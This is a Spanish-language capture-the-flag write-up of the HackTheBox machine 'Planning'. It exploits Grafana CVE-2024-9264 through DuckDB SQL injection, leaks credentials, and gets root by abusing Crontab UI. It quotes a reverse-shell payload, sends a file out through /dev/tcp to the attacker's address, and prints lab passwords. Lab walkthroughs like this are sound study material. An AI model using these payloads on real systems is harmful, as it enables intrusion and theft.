---
title: Planning - Easy (HTB)
permalink: /Planning-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "Subdomain Fuzzing"
  - "Grafana"
  - "CVE-2024-9264"
  - "Dynamic Port Forwarding"
  - "Cron Jobs"
categories:
  - writeup
  - hacking
  - hackthebox
  - hacking web
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Planning - Easy (HTB)
seo_description: Explota un CVE dentro del servicio Grafana y abusa de tareas cron en Crontab UI para vencer Planning.
excerpt: Explota un CVE dentro del servicio Grafana y abusa de tareas cron en Crontab UI para vencer Planning.
header:
  overlay_image: /assets/images/headers/planning-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/planning-hackthebox.jpg
---


![image-center](/assets/images/posts/planning-hackthebox.png)
{: .align-center}

**Habilidades:** Subdomain Fuzzing, Grafana `DuckDB` SQL Injection (CVE-2024-9264), Credentials Leakage - Environment Variables and File Analysis, Dynamic Port Forwarding, Abusing `cron` Jobs - `Crontab UI`
{: .notice--primary}

# Introducción

Planning es una máquina Linux de dificultad Easy en HackTheBox donde se nos presenta un entorno web el cual debemos enumerar para encontrar subdominios válidos, explotar una versión vulnerable de Grafana, encontrar credenciales almacenadas en un contenedor para ganar acceso al sistema. Abusaremos de tareas Cron en un servicio interno que nos permitirá otorgarnos privilegios elevados en la máquina.

HackTheBox nos proporciona unas credenciales en el siguiente mensaje:

>Machine Information
>
>As is common in real life pentests, you will start the Planning box with credentials for the following account: `admin` / `0D5oT70Fq13EvB5r`
{: .notice--info}
<br>
# Reconocimiento
---
Primeramente enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.68    
PING 10.10.11.68 (10.10.11.68) 56(84) bytes of data.
64 bytes from 10.10.11.68: icmp_seq=1 ttl=63 time=278 ms

--- 10.10.11.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 278.441/278.441/278.441/0.000 ms
~~~


## Nmap Scanning 

Iniciaremos con un escaneo de puertos donde identificaremos puertos abiertos en la máquina víctima

~~~ bash
# Escaneo de puertos abiertos
nmap --open -p- --min-rate 5000 -n -sS -Pn 10.10.11.68 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 16:20 EDT
Nmap scan report for 10.10.11.68
Host is up (0.24s latency).
Not shown: 58389 closed tcp ports (reset), 7143 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http

Nmap done: 1 IP address (1 host up) scanned in 19.95 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo más exhaustivo frente a los puertos abiertos que descubrimos

~~~ bash
nmap -p 22,80 -sVC 10.10.11.68 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 16:23 EDT
Nmap scan report for 10.10.11.68
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.24 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Logramos ver dos servicios, `http` y `ssh`, además de que el servidor nos intenta redirigir a `planning.htb`. Agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para que nuestro sistema logre resolverlo, debería verse de la siguiente manera

~~~ bash
cat /etc/hosts | grep planning.htb  

10.10.11.68 planning.htb
~~~


## Web Analysis

Analizaremos la web, primeramente podemos hacer un escaneo de las tecnologías que ejecute el servidor en el puerto `80`

~~~ bash
whatweb http://planning.htb                                                                                                       
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
~~~

Vemos que se utiliza `nginx` y su versión (`1.24.0`), que posee un CVE asociado a una denegación de servicio pero que no nos interesa, además de un email de contacto y versión de `jquery`. Vemos también el título de la web: `Edukate - Online Education Website`. Visitaremos el dominio para acceder a su contenido

![image-center](/assets/images/posts/planning-web-analysis.png)
{: .align-center}


## (Posible) Fuzzing

Si investigamos el sitio no encontraremos posibles vectores, solamente páginas acorde con el servicio y que no nos brindarán grandes pistas. Si aplicamos `fuzzing` veremos los recursos disponibles

~~~ bash
gobuster dir -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 10 -x php,txt    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 23914]
/contact.php          (Status: 200) [Size: 10632]
/about.php            (Status: 200) [Size: 12727]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/detail.php           (Status: 200) [Size: 13006]
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
~~~


## Subdomain Fuzzing

Intentaremos ir más profundo con la enumeración y haremos `fuzzing` a subdominios para intentar descubrir un nuevo servicio. En mi caso **tuve que intentar con varios `wordlists`**, hasta que encontré lo siguiente 

~~~ bash
gobuster vhost -u http://planning.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -t 20 --append-domain                           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb/
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
~~~

Encontraremos el subdominio `grafana.planning.htb`, lo agregaremos a nuestro archivo `/etc/hosts` para aplicar la resolución DNS correctamente y poder alcanzarlo

~~~ bash                
10.10.11.68 planning.htb grafana.planning.htb
~~~
<br>


# Intrusión / Explotación
---
## `Grafana` Analysis

> Grafana es una plataforma de código abierto para **visualización y análisis de datos**, ampliamente utilizada para monitorizar infraestructuras y aplicaciones IT en tiempo real.
{: .notice--info}

Con el nuevo subdominio incorporado, podemos realizar un nuevo escaneo de tecnologías web antes de visitar el subdominio en el navegador

~~~ bash
whatweb http://grafana.planning.htb   
http://grafana.planning.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block], nginx[1.24.0]

http://grafana.planning.htb/login [200 OK] Country[RESERVED][ZZ], Grafana[11.0.0], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.24.0]
~~~

Cuando visitemos `grafana.planning.htb`, el servidor automáticamente nos redirige a `/login`

![image-center](/assets/images/posts/planning-grafana.png)
{: .align-center}

Iniciaremos sesión con las credenciales que nos proporcionaron al comienzo de la máquina


## Grafana DuckDB SQL Injection (CVE-2024-9264)

La versión de Grafana que se utiliza en este servicio corresponde a la `v11.0.0`. Realizando una pequeña investigación, encontraremos que esta versión contiene un CVE relacionado con SQL Injection, podemos obtener una prueba de concepto (PoC) en el siguiente [repositorio](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit).

En este exploit se realizan consultas SQL maliciosas que son utilizadas para almacenar un recurso `rev`, que más tarde ejecuta para enviarnos una reverse shell

~~~ python
# Guarda una reverse shell en /tmp/rev
"expression": f"SELECT 1;COPY (SELECT 'sh -i >& {reverse_shell_command}') TO '/tmp/rev';"

# Ejecuta el recurso /tmp/rev
"expression":"SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash /tmp/rev |');"
~~~

Antes de ejecutar el exploit, pondremos un puerto a la escucha, en mi caso, el `443`, que será el puerto por el cual recibiré la conexión

~~~ bash
nc -lvnp 443
~~~

Ejecutaremos el exploit enviando los siguientes parámetros, tales como la URL de Grafana, las credenciales que utilizamos para iniciar sesión en el servicio, y los datos de nuestro listener, recuerda usar tu IP de HTB en el parámetro `--remote-ip`

~~~ bash
python3 poc.py --url http://grafana.planning.htb/ --username admin --password '0D5oT70Fq13EvB5r' --reverse-ip 10.10.14.169 --reverse-port 443 

[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 443
~~~


## Shell as `root` - `Grafana` Container

Recibiremos la conexión y ganaremos acceso como `root` a un contenedor, podemos comprobarlo por el nombre del host y la IP

~~~ bash
nc -lvnp 443   
listening on [any] 443 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.11.68] 50428
sh: 0: can't access tty; job control turned off
# id                       
uid=0(root) gid=0(root) groups=0(root)
# hostname -I
172.17.0.2
# hostname
7ce659d667d7
~~~

### TTY Treatment

Haremos un tratamiento de la `tty` para obtener una consola más interactiva que nos permita  desplazarnos, hacer `Ctrl + C` sin que muera la consola, limpiar la pantalla con `Ctrl + L` y tener las proporciones de nuestra terminal 

~~~ bash
# script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@7ce659d667d7:~# ^Z
[1]  + 55575 suspended  nc -lvnp 4646
root@parrot planning # stty raw -echo; fg
[1]  + 55575 continued  nc -lvnp 4646
                                     reset xterm

root@7ce659d667d7:~# export TERM=xterm
root@7ce659d667d7:~# stty rows 44 columns 184
~~~
<br>


# Intrusión / Explotación - `planning`
---
## Credentials Leakage

Si ejecutamos el comando `env` para listar las variables de entorno asignadas en este sistema, veremos credenciales para un usuario en las variables `GF_SECURITY_ADMIN_USER/PASSWORD` 

~~~ bash
root@7ce659d667d7:~# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
~~~


## Shell as `enzo` - `planning`

Utilizaremos estas credenciales para obtener una consola a través de `ssh`

~~~ bash
ssh enzo@10.10.11.68
enzo@10.10.11.68\'s password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 11 04:52:14 PM UTC 2025

  System load:  0.21              Processes:             272
  Usage of /:   65.3% of 6.30GB   Users logged in:       0
  Memory usage: 42%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 11 16:52:15 2025 from 10.10.14.169
enzo@planning:~$ 
~~~

Cambiaremos el valor de la variable `TERM` para poder limpiar la pantalla con `Ctrl + L`

~~~ bash
enzo@planning:~$ export TERM=xterm
~~~

En este punto ya podremos ver la flag del usuario no privilegiado

~~~ bash
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt 
920...
~~~
<br>


# Escalada de Privilegios
---
## System Enumeration

Ahora nuestro objetivo es escalar nuestros privilegios, porque el usuario `enzo` no puede ejecutar acciones privilegiadas, así que haremos una enumeración básica del sistema para identificar un vector de escalada

### (Posible) Sudoers Privileges

Podemos intentar ver privilegios `sudo` de los que dispongamos, esto nos permitiría ejecutar acciones como `root`, sin embargo, este usuario no posee una configuración en `sudoers`

~~~ bash
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
~~~


## Internally Open Ports

Podemos listar puertos abiertos internamente, o sea, que solamente son accesibles desde la propia máquina, **nota que la dirección IP de algunos puertos apunta a `localhost`**, esto es lo que buscamos

~~~ bash
enzo@planning:~$ ss -tunl | grep LISTEN
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:34683      0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000       0.0.0.0:*          
tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096               *:22               *:*
~~~


## SSH Dynamic Port Forwarding

Haremos accesibles estos puertos mediante un reenvío hacia nuestra máquina atacante, aprovechando la conexión con `ssh` con credenciales 

~~~ bash
ssh enzo@planning.htb -D
~~~

- `-D`: Habilitar el reenvío dinámico

### Scanning Services

Podemos usar `proxychains` para utilizar el túnel que hemos definido en nuestro puerto `1080`

> Verifica que la configuración de `proxychains` tenga activo la opción `strict_chain` además del puerto que utilizamos para establecer el túnel SSH
{: .notice--warning}

~~~ bash
...
...
...
strict_chain
...
...
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
#socks5	127.0.0.1 9050
socks5 127.0.0.1 1080
~~~

Ahora con la ayuda de `nmap` podemos realizan un escaneo que intente identificar versiones de los servicios que se ejecutan, en este caso debemos hacer un escaneo a `localhost`

~~~ bash
proxychains -q nmap -sT -p 3000,8000,3306 --min-rate 3000 -Pn -n -sVC 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 19:41 EDT
Nmap scan report for 127.0.0.1
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Content-Type: text/html; charset=utf-8
|     Location: /login
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 11 May 2025 23:42:39 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Content-Type: text/html; charset=utf-8
|     Location: /login
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 11 May 2025 23:42:04 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Location: /login
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 11 May 2025 23:42:10 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.24.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.41_Auto_Generated_Server_Certificate
| Not valid before: 2025-02-28T20:41:20
|_Not valid after:  2035-02-26T20:41:20
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.24.04.1
|   Thread ID: 75633
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, FoundRows, Speaks41ProtocolOld, LongColumnFlag, ODBCClient, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, SupportsLoadDataLocal, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: O\x0FF\x0Bx>XKl3<\x13\x7F,e /\x17&j
|_  Auth Plugin Name: caching_sha2_password
8000/tcp open  http    Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Area
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=5/11%Time=682135CC%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,118,"HTTP/1\.0\x20302\x20Found\r\nCache-Con
SF:trol:\x20no-store\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLo
SF:cation:\x20/login\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Opti
SF:ons:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\
SF:x2011\x20May\x202025\x2023:42:04\x20GMT\r\nContent-Length:\x2029\r\n\r\
SF:n<a\x20href=\"/login\">Found</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,D2,"HTTP
SF:/1\.0\x20302\x20Found\r\nCache-Control:\x20no-store\r\nLocation:\x20/lo
SF:gin\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r
SF:\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2011\x20May\x
SF:202025\x2023:42:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerbero
SF:s,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(FourOhFourRequest,182,"HTTP/1\.0\x20302\x20Found\r\nCache-Control:
SF:\x20no-store\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocatio
SF:n:\x20/login\r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri
SF:%256Eity\.txt%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Prot
SF:ection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2011\x20May\x202025\x2023
SF::42:39\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fou
SF:nd</a>\.\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.86 seconds
~~~

Si hacemos la solicitud de forma manual al servicio que se ejecuta en el puerto `8000`, podemos ver que se trata de autenticación básica HTTP, debido al código de estado y el header `WWW-Authenticate: Basic realm`

> Como configuramos un , en vez de enviar la solicitud a la IP de la máquina víctima, la enviamos a `localhost`, y es `proxychains` 
{: .notice--danger}

~~~ bash
proxychains -q curl http://localhost:8000/ -I
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
WWW-Authenticate: Basic realm="Restricted Area"
Content-Type: text/html; charset=utf-8
Content-Length: 0
ETag: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
Date: Sun, 11 May 2025 18:17:59 GMT
Connection: keep-alive
Keep-Alive: timeout=5
~~~

### FoxyProxy Setup

Para visitar la web a través de un navegador, tendremos que configurar el proxy por el cual está a la escucha nuestra máquina, en este caso, el puerto `1080` hace referencia al túnel que abrimos con `ssh`.

Configura un proxy en la extensión `FoxyProxy` con las siguientes características, luego haz clic en `Save` para guardarlo

![image-center](/assets/images/posts/planning-foxyproxy.png)
{: .align-center}

Finalmente tendrás que seleccionar el proxy que acabamos de crear antes de navegar hasta `localhost:8000`

![image-center](/assets/images/posts/planning-http-auth.png)
{: .align-center}


## Interesting File Analysis

Revisando directorios en el sistema encontraremos el siguiente recurso dentro de `/opt`. Al parecer se trata de un archivo JSON

~~~ bash
enzo@planning:~$ ls /opt
containerd  crontabs
enzo@planning:~$ ls /opt/crontabs/
crontab.db
enzo@planning:~$ file /opt/crontabs/crontab.db 
/opt/crontabs/crontab.db: New Line Delimited JSON text data
~~~

Podemos transferirnos el archivo a nuestra máquina haciendo uso de un socket que se define en la ruta especial `/dev/tcp`. Este socket nos permite **entablar conexiones fácilmente** con un solo comando, en este caso, enviaremos el archivo a nuestra máquina de la siguiente manera

Primeramente necesitaremos tener un puerto a la escucha, en mi caso seleccionaré el puerto `8000`, y redirigimos la salida a un archivo `crontab.db`

~~~ bash
nc -lvnp 8000 > crontab.db
listening on [any] 8000 ...
~~~

Ahora con el siguiente comando leeremos el contenido del archivo y lo enviaremos a nuestra IP por el puerto `8000`

~~~ bash
enzo@planning:~$ cat /opt/crontabs/crontab.db > /dev/tcp/10.10.14.169/8000
~~~ 

### (Tip) Verifying File Integrity with `md5sum`

Para validar la integridad del archivo en la transferencia, podemos computar el hash MD5 resultante de este archivo en ambas máquinas. Si el hash cambia, sabremos que el archivo está corrupto

~~~ bash
# Máquina víctima (original)
enzo@planning:~$ md5sum /opt/crontabs/crontab.db
b5d0a1472c202284c52e62f51d764bd5  /opt/crontabs/crontab.db

# Máquina atacante (copia)
md5sum crontab.db    
b5d0a1472c202284c52e62f51d764bd5  crontab.db
~~~


## Credentials Leakage

Si vemos el contenido del archivo `crontab.db` con la ayuda de `jq`, podemos ver lo siguiente

~~~ bash
cat crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
~~~

Vemos que se ejecuta un comando con `docker` que ejecuta una copia de Grafana y se asigna una contraseña a un comprimido `.zip`.

Intentaremos autenticarnos en el puerto `8000` con las credenciales que encontramos en el archivo `crontab.db`

~~~ bash
root_grafana:P4ssw0rdS0pRi0T3c
~~~

Funcionará si intentamos con el usuario `root` desde el panel de autenticación

![image-center](/assets/images/posts/planning-http-auth-2.png)
{: .align-center}


## Abusing Cron Jobs - `Crontab UI`
 
 Cron es un programa que nos permite ejecutar tareas de acuerdo a intervalos regulares de tiempo. Su sintaxis se define de la siguiente manera.

~~~ text
*    *    *    *    *   /home/user/bin/script.sh
|    |    |    |    |            |
|    |    |    |    |    Command or Script to execute
|    |    |    |    |
|    |    |    |    Día de la semana(0-6 | Sun-Sat)
|    |    |    |
|    |    |    Mes (1-12)
|    |    |
|    |    Día del mes (1-31)
|    |
|    Hora (0-23)
|
Minuto (0-59)
~~~ 

Las tareas cron (o `Cron jobs`) son **comandos o scripts que se ejecutan automáticamente en un servidor**, en un horario predefinido o en intervalos regulares.

El servidor nos redirige a la siguiente web, donde al parecer tenemos un panel de administración de tareas `cron`, se trata del servicio [`Crontab UI`](https://github.com/alseambusher/crontab-ui).

> Crontab UI es una interfaz web (GUI) de código abierto que facilita la gestión de los trabajos programados (cron jobs) en sistemas operativos Unix y Linux.
{: .notice--info}

![image-center](/assets/images/posts/planning-abusing-cron.png)
{: .align-center}

Crearemos una nueva tarea `cron` que le asigne el bit `suid` a la `bash`. Haremos clic en el botón azul `New` y definiremos lo siguiente.

No necesitaremos configurarlo para que se ejecute cada minuto, esto debido a que se eliminan las tareas nuevas, así que no dejes pasar mucho tiempo para escalar privilegios

![image-center](/assets/images/posts/planning-abusing-cron-2.png)
{: .align-center}


## Root Time

Ejecutaremos la tarea ahora haciendo clic en `Run Now` en la tarea que hemos creado

![image-center](/assets/images/posts/planning-abusing-cron-2.png)
{: .align-center}

Al momento que ejecutemos la tarea `cron`, veremos que `bash` se ha vuelto un binario `suid`. Ejecutaremos una `bash` como `root` con el comando `bash -p`

~~~ bash
enzo@planning:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash

enzo@planning:~$ bash -p
bash-5.2# 
~~~

Ya podemos ver la flag del sistema ubicada en el directorio `/root`

~~~ bash
bash-5.2# cat /root/root.txt
99a...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Experience can only be gained by doing not by thinking or dreaming.
> — Byron Pulsifer
{: .notice--info}
